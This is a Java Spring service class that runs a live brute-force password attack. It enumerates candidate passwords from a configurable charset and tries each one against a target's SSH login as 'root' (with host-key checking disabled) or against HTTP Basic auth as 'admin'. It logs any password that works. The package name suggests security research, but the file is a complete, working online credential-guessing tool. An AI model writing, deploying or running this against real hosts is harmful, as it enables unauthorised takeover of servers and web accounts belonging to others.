package com.research.cybersec.services;

import lombok.Data;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.function.Consumer;

@Service
@Slf4j
public class BruteForceGenerator {
    
    @Data
    public static class BruteForceConfig {
        private int minLength = 1;
        private int maxLength = 8;
        private boolean useNumbers = true;
        private boolean useLowercase = true;
        private boolean useUppercase = false;
        private boolean useSpecialChars = false;
        private String customCharset = "";
        private String numberRange = "0-9";
        private boolean useCustomRange = false;
        private long maxAttempts = 1000000;
        private int threadsCount = 4;
        private int delayMs = 0;
    }
    
    @Data
    public static class BruteForceStats {
        private long totalCombinations;
        private long currentAttempt;
        private long attemptsPerSecond;
        private long elapsedTimeMs;
        private String currentPassword;
        private boolean found;
        private String foundPassword;
        private double progressPercent;
    }
    
    private final AtomicBoolean isRunning = new AtomicBoolean(false);
    private final AtomicLong attemptCounter = new AtomicLong(0);
    private CompletableFuture<Void> currentTask;
    
    public CompletableFuture<BruteForceStats> startBruteForce(BruteForceConfig config, String target, 
                                                             Consumer<String> logCallback,
                                                             Consumer<BruteForceStats> statsCallback) {
        
        return CompletableFuture.supplyAsync(() -> {
            if (isRunning.get()) {
                logCallback.accept("[❌] Brute force already running!");
                return null;
            }
            
            isRunning.set(true);
            attemptCounter.set(0);
            
            try {
                return executeBruteForce(config, target, logCallback, statsCallback);
            } finally {
                isRunning.set(false);
            }
        });
    }
    
    public void stopBruteForce() {
        isRunning.set(false);
        if (currentTask != null) {
            currentTask.cancel(true);
        }
    }
    
    private BruteForceStats executeBruteForce(BruteForceConfig config, String target,
                                            Consumer<String> logCallback,
                                            Consumer<BruteForceStats> statsCallback) {
        
        logCallback.accept("[🚀] Initializing brute force attack");
        logCallback.accept("[⚙️] Configuration:");
        logCallback.accept("    • Length: " + config.minLength + "-" + config.maxLength);
        logCallback.accept("    • Numbers: " + config.useNumbers);
        logCallback.accept("    • Lowercase: " + config.useLowercase);
        logCallback.accept("    • Uppercase: " + config.useUppercase);
        logCallback.accept("    • Special chars: " + config.useSpecialChars);
        logCallback.accept("    • Threads: " + config.threadsCount);
        logCallback.accept("    • Max attempts: " + config.maxAttempts);
        
        String charset = buildCharset(config);
        logCallback.accept("[📝] Charset: " + charset + " (" + charset.length() + " characters)");
        
        long totalCombinations = calculateTotalCombinations(charset.length(), config.minLength, config.maxLength);
        logCallback.accept("[📊] Total combinations: " + totalCombinations);
        
        if (totalCombinations > config.maxAttempts) {
            logCallback.accept("[⚠️] Limited to " + config.maxAttempts + " attempts");
            totalCombinations = config.maxAttempts;
        }
        
        BruteForceStats stats = new BruteForceStats();
        stats.totalCombinations = totalCombinations;
        
        long startTime = System.currentTimeMillis();
        
        logCallback.accept("[🔥] Starting brute force attack...");
        
        // Generate and test passwords
        for (int length = config.minLength; length <= config.maxLength && isRunning.get(); length++) {
            logCallback.accept("[📏] Testing passwords of length " + length);
            
            if (testPasswordsOfLength(charset, length, config, target, logCallback, statsCallback, stats, startTime)) {
                break; // Password found
            }
        }
        
        long endTime = System.currentTimeMillis();
        stats.elapsedTimeMs = endTime - startTime;
        
        if (stats.found) {
            logCallback.accept("[🎉] SUCCESS! Password found: " + stats.foundPassword);
            logCallback.accept("[⏱️] Time taken: " + (stats.elapsedTimeMs / 1000.0) + " seconds");
            logCallback.accept("[📊] Attempts made: " + stats.currentAttempt);
        } else {
            logCallback.accept("[❌] Password not found in search space");
            logCallback.accept("[📊] Total attempts: " + stats.currentAttempt);
        }
        
        return stats;
    }
    
    private boolean testPasswordsOfLength(String charset, int length, BruteForceConfig config, 
                                        String target, Consumer<String> logCallback,
                                        Consumer<BruteForceStats> statsCallback, 
                                        BruteForceStats stats, long startTime) {
        
        int[] indices = new int[length];
        long passwordsAtThisLength = (long) Math.pow(charset.length(), length);
        
        for (long i = 0; i < passwordsAtThisLength && isRunning.get() && attemptCounter.get() < config.maxAttempts; i++) {
            
            // Generate password from indices
            StringBuilder password = new StringBuilder();
            for (int j = 0; j < length; j++) {
                password.append(charset.charAt(indices[j]));
            }
            
            String currentPassword = password.toString();
            long currentAttempt = attemptCounter.incrementAndGet();
            
            // Update stats
            stats.currentAttempt = currentAttempt;
            stats.currentPassword = currentPassword;
            stats.progressPercent = (double) currentAttempt / stats.totalCombinations * 100;
            
            long elapsed = System.currentTimeMillis() - startTime;
            stats.elapsedTimeMs = elapsed;
            if (elapsed > 0) {
                stats.attemptsPerSecond = currentAttempt * 1000 / elapsed;
            }
            
            // Test password
            if (testPassword(currentPassword, target, logCallback)) {
                stats.found = true;
                stats.foundPassword = currentPassword;
                return true;
            }
            
            // Update GUI every 100 attempts
            if (currentAttempt % 100 == 0) {
                statsCallback.accept(stats);
                logCallback.accept("[🔍] Attempt " + currentAttempt + ": " + currentPassword + 
                                 " (" + String.format("%.2f", stats.progressPercent) + "%)");
            }
            
            // Delay if configured
            if (config.delayMs > 0) {
                try {
                    Thread.sleep(config.delayMs);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return false;
                }
            }
            
            // Increment indices (like odometer)
            incrementIndices(indices, charset.length());
        }
        
        return false;
    }
    
    private void incrementIndices(int[] indices, int base) {
        int carry = 1;
        for (int i = 0; i < indices.length && carry > 0; i++) {
            indices[i] += carry;
            if (indices[i] >= base) {
                indices[i] = 0;
                carry = 1;
            } else {
                carry = 0;
            }
        }
    }
    
    private boolean testPassword(String password, String target, Consumer<String> logCallback) {
        // Use real authentication testing
        if (target.contains("ssh") || target.contains("22")) {
            return testRealSSH(password, target, logCallback);
        } else if (target.contains("http") || target.contains("80") || target.contains("443")) {
            return testRealHTTP(password, target, logCallback);
        } else {
            logCallback.accept("[⚠️] Protocol not supported for real testing: " + target);
            return false;
        }
    }
    
    private boolean testRealSSH(String password, String target, Consumer<String> logCallback) {
        try {
            // Extract host and port from target
            String[] parts = target.split(":");
            String host = parts[0];
            int port = parts.length > 1 ? Integer.parseInt(parts[1]) : 22;
            
            // Use JSch for real SSH testing
            com.jcraft.jsch.JSch jsch = new com.jcraft.jsch.JSch();
            com.jcraft.jsch.Session session = jsch.getSession("root", host, port);
            session.setPassword(password);
            session.setConfig("StrictHostKeyChecking", "no");
            session.setTimeout(5000); // 5 second timeout
            
            session.connect();
            session.disconnect();
            
            logCallback.accept("[✅] SSH connection successful: " + password);
            return true;
            
        } catch (Exception e) {
            // Connection failed - wrong password or other error
            return false;
        }
    }
    
    private boolean testRealHTTP(String password, String target, Consumer<String> logCallback) {
        try {
            // Extract host and port from target
            String[] parts = target.split(":");
            String host = parts[0];
            int port = parts.length > 1 ? Integer.parseInt(parts[1]) : 80;
            
            // Use Java HTTP client for real HTTP basic auth testing
            java.net.http.HttpClient client = java.net.http.HttpClient.newBuilder()
                .connectTimeout(java.time.Duration.ofSeconds(5))
                .build();
            
            String credentials = "admin:" + password;
            String encodedCredentials = java.util.Base64.getEncoder()
                .encodeToString(credentials.getBytes());
            
            java.net.http.HttpRequest request = java.net.http.HttpRequest.newBuilder()
                .uri(java.net.URI.create("http://" + host + ":" + port + "/"))
                .header("Authorization", "Basic " + encodedCredentials)
                .timeout(java.time.Duration.ofSeconds(5))
                .GET()
                .build();
            
            java.net.http.HttpResponse<String> response = client.send(request, 
                java.net.http.HttpResponse.BodyHandlers.ofString());
            
            if (response.statusCode() == 200) {
                logCallback.accept("[✅] HTTP auth successful: admin:" + password);
                return true;
            }
            
            return false;
            
        } catch (Exception e) {
            // Connection failed - wrong password or other error
            return false;
        }
    }
    

    
    private String buildCharset(BruteForceConfig config) {
        StringBuilder charset = new StringBuilder();
        
        if (!config.customCharset.isEmpty()) {
            return config.customCharset;
        }
        
        if (config.useNumbers) {
            if (config.useCustomRange && !config.numberRange.isEmpty()) {
                charset.append(parseNumberRange(config.numberRange));
            } else {
                charset.append("0123456789");
            }
        }
        
        if (config.useLowercase) {
            charset.append("abcdefghijklmnopqrstuvwxyz");
        }
        
        if (config.useUppercase) {
            charset.append("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
        }
        
        if (config.useSpecialChars) {
            charset.append("!@#$%^&*()_+-=[]{}|;:,.<>?");
        }
        
        return charset.toString();
    }
    
    private String parseNumberRange(String range) {
        StringBuilder result = new StringBuilder();
        
        if (range.contains("-")) {
            String[] parts = range.split("-");
            if (parts.length == 2) {
                try {
                    int start = Integer.parseInt(parts[0]);
                    int end = Integer.parseInt(parts[1]);
                    
                    for (int i = start; i <= end; i++) {
                        result.append(i);
                    }
                } catch (NumberFormatException e) {
                    return "0123456789"; // fallback
                }
            }
        } else {
            return range; // use as-is
        }
        
        return result.toString();
    }
    
    private long calculateTotalCombinations(int charsetSize, int minLength, int maxLength) {
        long total = 0;
        for (int length = minLength; length <= maxLength; length++) {
            total += Math.pow(charsetSize, length);
        }
        return total;
    }
    
    public boolean isRunning() {
        return isRunning.get();
    }
    
    public long getCurrentAttempt() {
        return attemptCounter.get();
    }
}